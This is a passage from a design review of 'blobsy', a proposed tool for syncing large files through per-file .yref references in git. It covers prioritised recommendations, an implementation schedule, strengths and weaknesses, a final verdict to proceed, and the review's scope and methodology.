   $ git add *.yref .gitignore .blobsy.yml
   $ git commit -m "Migrate from DVC to blobsy"
   $ blobsy sync
   $ git push
   ```

```

---

## 9. Final Recommendations

### 9.1 Critical (Must Address for V1)

**Priority 0 (Blockers):**

1. **Add safeguards for push/commit coordination**
   - Implement `blobsy commit` convenience command
   - Make `blobsy sync` refuse uncommitted changes by default
   - Add `blobsy check-unpushed` command
   - Install pre-push git hook via `blobsy init`
   - **Impact:** Prevents the #1 user error

2. **Add progress reporting**
   - Progress bars for transfers
   - ETA and current file
   - Transfer speed (MB/s)
   - Overall progress (N/M files)
   - **Impact:** Essential UX for large transfers

3. **Improve error messages**
   - Wrap external tool errors with context
   - Add troubleshooting hints
   - Link to `blobsy doctor` for diagnosis
   - **Impact:** Reduces user confusion

**Priority 1 (Important):**

4. **Simplify templates to named layouts**
   - Provide presets: chronological, content-addressable, branch-isolated, path-mirrored
   - Raw templates are expert mode only
   - Validate template changes with warnings
   - **Impact:** Reduces cognitive load, prevents errors

5. **Fix stat cache edge cases**
   - Use nanosecond resolution
   - Conservative invalidation
   - Add `--no-cache` flag
   - **Impact:** Prevents hash mismatches

6. **Add template consistency checks**
   - Validate repo config vs user config
   - Warn on mismatches in `blobsy doctor`
   - **Impact:** Prevents dedup breakage

7. **Add security warnings for custom endpoints**
   - Warn on non-AWS endpoints
   - Require confirmation for first push
   - Support trusted_endpoints whitelist
   - **Impact:** Prevents data exfiltration

### 9.2 Important (Should Address for V1)

**Priority 2 (Nice to Have):**

8. **Handle edge cases**
   - Symlink cycles (detect and error)
   - Case sensitivity (warn on macOS/Linux differences)
   - Unicode normalization (normalize to NFC)
   - Partial file writes (skip recently-modified files)
   - Concurrent operations (file locking)
   - **Impact:** Robustness

9. **Add missing features**
   - Bandwidth limiting (`--bwlimit`)
   - Resume support (delegate to tools)
   - Cost estimation (`blobsy cost-estimate`)
   - Dry-run for all commands
   - **Impact:** Better UX and control

10. **Optimize performance**
    - Parallel YAML parsing
    - In-memory ref cache (during single invocation)
    - Efficient git operations (`git add -A`, `--porcelain`)
    - **Impact:** Faster for large repos

### 9.3 Defer to V2 (Can Wait)

11. **Batched transfers** - Already in V2 plan
12. **Binary .yref format** - For repos with >1,000 files
13. **Remote verification** - `blobsy verify --remote`
14. **Selective pull** - `--include`, `--exclude`, `--max-size`
15. **Template migration tool** - Convert between layouts
16. **GC implementation** - With strict safety checks

### 9.4 Implementation Sequence

**Recommended order:**

**Phase 1: Core functionality (3-4 weeks)**
- Implement basic commands (`init`, `track`, `push`, `pull`, `status`, `verify`)
- Transfer delegation (aws-cli, rclone, SDK fallback)
- Compression (Node.js zlib)
- Gitignore management
- Config hierarchy

**Phase 2: UX improvements (2-3 weeks)**
- Progress bars and ETA
- Better error messages
- `blobsy doctor` diagnostics
- `--json` output
- Comprehensive `--help` text

**Phase 3: Safety and robustness (2-3 weeks)**
- Push/commit coordination safeguards
- Template simplification (named layouts)
- Stat cache correctness
- Security warnings
- Edge case handling

**Phase 4: Performance and polish (1-2 weeks)**
- Parallel YAML parsing
- Efficient git operations
- Cost estimation
- Documentation
- Examples and tutorials

**Total: ~8-12 weeks to production-ready V1**

---

## 10. Overall Verdict

### 10.1 Strengths (What Makes This Design Great)

1. **Architectural elegance**
   - Per-file `.yref` approach is brilliant
   - "Git is the manifest" eliminates massive complexity
   - Delegation to git and external tools is pragmatic

2. **Well-researched**
   - Comprehensive comparison to alternatives
   - Learns from existing tools (DVC, Git LFS, HF Hub)
   - Identifies real gap in ecosystem

3. **Thoughtful principles**
   - Simple, transparent, externalize
   - Unopinionated where it doesn't matter
   - One primitive (file + .yref)

4. **Good V1/V2 scoping**
   - V1 is achievable and useful
   - V2 features are clearly deferred
   - No scope creep

### 10.2 Weaknesses (What Needs Work)

1. **User error scenarios**
   - Push/commit coordination is too easy to mess up
   - Needs stronger safeguards and better UX

2. **Template complexity**
   - Powerful but confusing
   - Needs simplification to named layouts

3. **Performance at scale**
   - Per-file transfers are slow for many small files
   - Needs validation with 10K+ files
   - YAML parsing overhead for large repos

4. **Missing edge cases**
   - Concurrent operations
   - Partial file writes
   - Platform differences (case, unicode)
   - Large files that don't fit on disk

### 10.3 Final Assessment

**This is a solid V1 design that fills a real gap in the ecosystem.**

The architectural choices are sound:
- Per-file `.yref` approach is cleaner than DVC's manifest-based system
- Content-addressable storage is the right choice
- Delegating to git for versioning is brilliant
- Pluggable backends solve the vendor lock-in problem

The key to success will be:
1. **Excellent error messages** - Guide users through mistakes
2. **Comprehensive testing** - Especially at scale and with failures
3. **Progressive disclosure** - Simple defaults, expert features available
4. **Good documentation** - Clear mental models, common pitfalls

With the critical issues addressed (push/commit coordination, template simplification, progress reporting), this could become a valuable tool that's cleaner than DVC and more flexible than Git LFS.

**Recommendation: Proceed with implementation** after addressing the critical issues identified in this review.

---

## Appendix: Review Scope and Methodology

**Documents reviewed:**
- [blobsy-design-v2.md](blobsy-design-v2.md) (2,475 lines) - Main design doc
- [research-2026-02-19-sync-tools-landscape.md](../../research/current/research-2026-02-19-sync-tools-landscape.md) - Related research

**Review focus areas:**
1. Architecture and design principles
2. Technical soundness and correctness
3. Complexity vs simplicity tradeoffs
4. Missing considerations and edge cases
5. Comparison to alternatives (DVC, Git LFS, rclone)
6. Implementation feasibility and risks
7. User experience and ergonomics
8. Performance and scalability
9. Security and trust model
10. Documentation and learnability

**Review methodology:**
- Senior engineering perspective (15+ years experience)
- Focus on practical implementation concerns
- Identify high-risk areas requiring extra care
- Provide actionable recommendations with priorities
- Compare to production systems at scale

**Not covered in this review:**
- Line-by-line code review (no code written yet)
- Detailed API design (internal interfaces)
- Specific library/dependency choices (e.g., which YAML parser)
- Marketing or go-to-market strategy

---

**End of Review**
```
